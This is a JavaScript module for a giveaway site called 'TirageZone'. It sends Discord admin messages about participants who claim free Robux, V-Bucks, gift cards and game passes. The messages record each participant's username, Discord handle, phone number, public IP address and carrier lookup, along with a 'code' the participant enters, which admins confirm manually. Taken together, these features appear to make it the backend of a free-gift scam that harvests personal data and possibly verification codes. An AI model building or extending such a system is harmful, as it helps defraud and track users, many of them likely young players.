import { decryptText } from "./security";

const DISCORD_API_BASE = "https://discord.com/api/v10";

function getDiscordToken() {
  return process.env.DISCORD_BOT_TOKEN || "";
}

function getDiscordChannelId() {
  return process.env.DISCORD_CHANNEL_ID || "";
}

function formatDate(value) {
  return new Intl.DateTimeFormat("fr-FR", {
    dateStyle: "medium",
    timeStyle: "short",
    timeZone: "Europe/Paris"
  }).format(new Date(value));
}

const STATUS_LABELS = {
  pending: "En attente",
  validated: "Validée",
  rejected: "Refusée"
};

const CODE_STATUS_LABELS = {
  pending: "Code en attente",
  confirmed: "Code confirmé",
  rejected: "Code refusé"
};

const GIFT_IMAGES = {
  "snap-plus": "/gifts/a57f81feccd968c8951f48d862af8b72-2002589690.jpg",
  robux: "/960px-Robux_2019_Logo_gold.svg-3582877259.png",
  vbucks: "/gifts/vbucks.svg",
  "psn-card": "/gifts/psn-card.svg",
  "xbox-card": "/gifts/xbox-card.svg",
  "brawl-pass": "/gifts/brawl-pass.svg",
  "brawl-pass-plus": "/gifts/brawl-pass-plus.svg",
  "brawl-pass-pro": "/gifts/brawl-pass-pro.svg",
  "brainrot-dragon-cannelloni": "/gifts/brainrot-secret.svg",
  "brainrot-strawberry-elephant": "/gifts/brainrot-secret.svg"
};

function valueOrDash(value) {
  return value ? String(value) : "-";
}

function siteUrl() {
  return process.env.NEXT_PUBLIC_SITE_URL || process.env.SITE_URL || process.env.URL || "";
}

function absoluteAssetUrl(assetPath) {
  const baseUrl = siteUrl();

  if (!baseUrl || !assetPath) {
    return "";
  }

  try {
    return new URL(assetPath, baseUrl).toString();
  } catch {
    return "";
  }
}

function publicIpFromEntry(entry) {
  if (entry.publicIp) {
    return entry.publicIp;
  }

  if (!entry.ipCipher) {
    return "Non disponible";
  }

  try {
    return decryptText(entry.ipCipher) || "Non disponible";
  } catch {
    return "Non disponible";
  }
}

function operatorFromEntry(entry) {
  const operator = entry.operatorVerification;

  if (!operator) {
    return "Non vérifié";
  }

  return [
    operator.carrier || "Opérateur inconnu",
    operator.countryName || "Pays inconnu",
    operator.lineType || "",
    operator.valid ? "numéro valide" : "numéro invalide"
  ].filter(Boolean).join(" · ");
}

function codeFromEntry(entry) {
  if (!entry.participantEnteredCode) {
    return "En attente";
  }

  const status = CODE_STATUS_LABELS[entry.participantCodeStatus] || "Code en attente";
  return `${entry.participantEnteredCode} · ${status}`;
}

function formatAdminDetails(entry) {
  return [
    `Cadeau: ${valueOrDash(entry.giftLabel)}`,
    `Pseudo: ${valueOrDash(entry.gamePseudo)}`,
    `Discord: ${valueOrDash(entry.discordPseudo)}`,
    `Téléphone: ${entry.maskedPhone || "Masqué"}`,
    `IP publique: ${publicIpFromEntry(entry)}`,
    `Statut: ${STATUS_LABELS[entry.status] || entry.status || "En attente"}`,
    `Raison: ${valueOrDash(entry.reviewReason)}`,
    `Opérateur: ${operatorFromEntry(entry)}`,
    `Code: ${codeFromEntry(entry)}`,
    `Date: ${formatDate(entry.createdAt || Date.now())}`
  ];
}

function embedField(name, value, inline = false) {
  return {
    name,
    value: `\`${valueOrDash(value)}\``,
    inline
  };
}

function embedLine(icon, label, value) {
  return `${icon} **${label}:**\n\`${valueOrDash(value)}\``;
}

function buildAdminEmbed(entry, options = {}) {
  const title = options.title || "# Nouvelle demande";
  const color = options.color || 0x8b5cf6;
  const thumbnailUrl = absoluteAssetUrl(GIFT_IMAGES[entry.giftId]);
  const details = [
    embedLine("🎁", "Cadeau", entry.giftLabel),
    embedLine("👤", "Pseudo", entry.gamePseudo || "Non fourni"),
    embedLine("💬", "Discord", entry.discordPseudo || "Non fourni"),
    embedLine("📞", "Téléphone", entry.maskedPhone || "Masqué"),
    embedLine("🌐", "IP publique", publicIpFromEntry(entry)),
    embedLine("🛡️", "Statut", STATUS_LABELS[entry.status] || entry.status || "En attente"),
    embedLine("📝", "Raison", entry.reviewReason || "-"),
    embedLine("🔎", "Opérateur", operatorFromEntry(entry)),
    embedLine("🔑", "Code", codeFromEntry(entry)),
    embedLine("🔄", "Date", formatDate(entry.createdAt || Date.now()))
  ];

  if (options.codeDate) {
    details.push(embedLine("🕒", "Date du code", formatDate(options.codeDate)));
  }

  return {
    title,
    description: [
      ...details,
      "",
      "⚠️ *Validation manuelle requise. Le gain n'est jamais automatique.*"
    ].join("\n"),
    color,
    thumbnail: thumbnailUrl ? { url: thumbnailUrl } : undefined,
    footer: { text: "TirageZone admin" },
    timestamp: new Date().toISOString()
  };
}

function buildPanelEmbed(participations) {
  const pendingEntries = participations.filter((entry) => entry.status === "pending");
  const pendingCodes = participations.filter(
    (entry) => entry.participantEnteredCode && entry.participantCodeStatus === "pending"
  );

  return {
    title: "# Panel admin",
    description: [
      embedLine("📥", "Inscriptions", participations.length),
      embedLine("✅", "À valider", pendingEntries.length),
      embedLine("🔑", "Codes à confirmer", pendingCodes.length),
      "",
      "⚠️ *Utilisez les boutons pour afficher les demandes en attente.*"
    ].join("\n"),
    color: 0x8b5cf6,
    footer: { text: "TirageZone admin" },
    timestamp: new Date().toISOString()
  };
}

function actionRow(buttons) {
  return {
    type: 1,
    components: buttons
  };
}

function button(label, customId, style) {
  return {
    type: 2,
    label,
    style,
    custom_id: customId
  };
}

function reviewButtons(entry) {
  return [
    button("✅ Valider", `confirm:${entry.id}`, 3),
    button("❌ Refuser", `reject:${entry.id}`, 4),
    button("📞 Numéro", `phone:${entry.id}`, 2),
    button("🔎 Lookup", `lookup:${entry.id}`, 1)
  ];
}

function codeReviewButtons(entry) {
  return [
    button("🏷️ Confirmer", `code_confirm:${entry.id}`, 3),
    button("❌ Refuser", `code_reject:${entry.id}`, 4),
    button("📞 Numéro", `phone:${entry.id}`, 2),
    button("🔎 Lookup", `lookup:${entry.id}`, 1)
  ];
}

export async function notifyMessage(entry) {
  const channelId = getDiscordChannelId();

  if (!getDiscordToken() || !channelId) {
    return { skipped: true };
  }

  await sendDiscordMessage(channelId, {
    embeds: [
      buildAdminEmbed(entry, {
        title: "# Nouvelle demande"
      })
    ],
    components: [
      actionRow(reviewButtons(entry))
    ]
  });

  return { skipped: false };
}

export async function notifyMessageCode(entry) {
  const channelId = getDiscordChannelId();

  if (!getDiscordToken() || !channelId) {
    return { skipped: true };
  }

  await sendDiscordMessage(channelId, {
    embeds: [
      buildAdminEmbed(entry, {
        title: "# Code reçu",
        color: 0x5865f2,
        codeDate: entry.participantCodeConfirmedAt || Date.now()
      })
    ],
    components: [
      actionRow(codeReviewButtons(entry))
    ]
  });

  return { skipped: false };
}

export async function sendMessageAdminPanel(channelId, participations) {
  const pendingEntries = participations.filter((entry) => entry.status === "pending");
  const pendingCodes = participations.filter(
    (entry) => entry.participantEnteredCode && entry.participantCodeStatus === "pending"
  );

  await sendDiscordMessage(channelId || getDiscordChannelId(), {
    embeds: [buildPanelEmbed(participations)],
    components: [
      actionRow([
        button("Inscriptions", "panel_entries", 2),
        button("Codes", "panel_codes", 2),
        button("Actualiser", "panel", 1)
      ])
    ]
  });
}

export async function sendMessagePendingEntries(channelId, participations) {
  const pendingEntries = participations
    .filter((entry) => entry.status === "pending")
    .slice(0, 10);

  if (pendingEntries.length === 0) {
    await sendDiscordMessage(channelId || getDiscordChannelId(), {
      content: "Aucune inscription en attente."
    });
    return;
  }

  for (const entry of pendingEntries) {
    await sendDiscordMessage(channelId || getDiscordChannelId(), {
      embeds: [
        buildAdminEmbed(entry, {
          title: "# Demande en attente"
        })
      ],
      components: [
        actionRow(reviewButtons(entry))
      ]
    });
  }
}

export async function sendMessagePendingCodes(channelId, participations) {
  const pendingCodes = participations
    .filter((entry) => entry.participantEnteredCode && entry.participantCodeStatus === "pending")
    .slice(0, 10);

  if (pendingCodes.length === 0) {
    await sendDiscordMessage(channelId || getDiscordChannelId(), {
      content: "Aucun code en attente."
    });
    return;
  }

  for (const entry of pendingCodes) {
    await sendDiscordMessage(channelId || getDiscordChannelId(), {
      embeds: [
        buildAdminEmbed(entry, {
          title: "# Code en attente",
          color: 0x5865f2,
          codeDate: entry.participantCodeConfirmedAt || Date.now()
        })
      ],
      components: [
        actionRow(codeReviewButtons(entry))
      ]
    });
  }
}

export async function sendDiscordMessage(channelId, payload) {
  const token = getDiscordToken();

  if (!token || !channelId) {
    return;
  }

  const response = await fetch(`${DISCORD_API_BASE}/channels/${channelId}/messages`, {
    method: "POST",
    headers: {
      Authorization: `Bot ${token}`,
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      allowed_mentions: { parse: [] },
      ...payload
    })
  });

  if (!response.ok) {
    const body = await response.json().catch(() => null);
    const description = body?.message || JSON.stringify(body);
    throw new Error(`Discord message failed: ${response.status} ${description}`);
  }
}

export function formatParticipationEntry(entry) {
  return [
    "**Nouvelle inscription**",
    "",
    ...formatAdminDetails(entry),
    "",
    "Statut: en attente"
  ].join("\n");
}

export function formatCodeEntry(entry) {
  return [
    "**Code de participation saisi**",
    "",
    ...formatAdminDetails(entry),
    `Date du code: ${formatDate(entry.participantCodeConfirmedAt || Date.now())}`,
    "",
    "Statut du code: en attente"
  ].join("\n");
}

export function finalActionComponents(label, style = 2) {
  return [
    actionRow([
      {
        type: 2,
        label,
        style,
        custom_id: "done",
        disabled: true
      }
    ])
  ];
}
